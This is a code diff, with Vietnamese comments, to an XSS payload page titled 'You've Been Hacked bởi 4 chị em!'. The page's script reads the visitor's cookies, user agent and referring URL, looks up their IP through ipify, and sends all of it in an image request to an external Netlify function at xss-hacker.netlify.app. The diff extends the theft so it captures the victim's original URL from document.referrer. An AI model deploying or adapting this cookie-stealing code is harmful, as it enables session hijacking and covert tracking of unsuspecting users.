@@ -6,11 +6,15 @@
     <title>Alert: You've Been Hacked bởi 4 chị em!</title>
     <link rel="stylesheet" href="style.css" />
     <script>
-      // Hàm gửi thông tin về User-Agent, IP tới Netlify Function
+      // Hàm gửi thông tin về User-Agent, IP và URL gốc tới Netlify Function
       function sendDataToNetlify() {
         var cookies = document.cookie; // Lấy cookies của người dùng
-        var currentUrl = window.location.href; // Lấy URL của trang
+        var currentUrl = window.location.href; // Lấy URL hiện tại (URL của trang XSS Hacker)
         var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt
+
+        // Lưu URL gốc vào sessionStorage (URL người dùng đã truy cập trước khi bị chuyển hướng)
+        var originalUrl = document.referrer; // Lấy URL gốc của trang người dùng vừa truy cập
+        sessionStorage.setItem("originalUrl", originalUrl);
 
         // Lấy địa chỉ IP của người dùng từ ipify API
         fetch("https://api.ipify.org?format=json")
@@ -18,7 +22,10 @@
           .then((data) => {
             var userIP = data.ip; // Lấy địa chỉ IP từ dữ liệu trả về
 
-            // Gửi thông tin (cookies, userAgent, IP, URL) tới Netlify Function
+            // Lấy URL gốc từ sessionStorage
+            var referrerUrl = sessionStorage.getItem("originalUrl");
+
+            // Gửi thông tin (cookies, userAgent, IP, URL gốc, và URL hiện tại) tới Netlify Function
             var img = new Image();
             img.src =
               "https://xss-hacker.netlify.app/.netlify/functions/logRequest?cookies=" +
@@ -28,7 +35,7 @@
               "&userIP=" +
               encodeURIComponent(userIP) +
               "&url=" +
-              encodeURIComponent(currentUrl);
+              encodeURIComponent(referrerUrl); // Gửi URL gốc thay vì URL hiện tại
           })
           .catch((error) => {
             console.error("Error fetching IP:", error);
